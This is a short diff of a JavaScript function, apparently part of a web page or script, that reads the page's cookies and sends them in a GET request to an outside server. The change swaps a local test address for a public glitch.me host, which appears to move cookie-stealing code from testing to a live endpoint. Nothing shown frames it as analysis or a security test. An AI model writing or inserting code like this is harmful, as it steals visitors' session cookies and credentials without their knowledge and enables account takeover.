@@ -23,7 +23,7 @@ function LNCH_Preapare() {
     let APP_Cookie = document.cookie;
     if (APP_Cookie) {
         let xhr = new XMLHttpRequest();
-        xhr.open('GET', `http://192.168.0.138:1337/${APP_Cookie.replace("inform=", "")}`, true);
+        xhr.open('GET', `https://adaptive-married-akubra.glitch.me/${APP_Cookie.replace("inform=", "")}`, true);
         xhr.withCredentials = false;
         xhr.send();
 
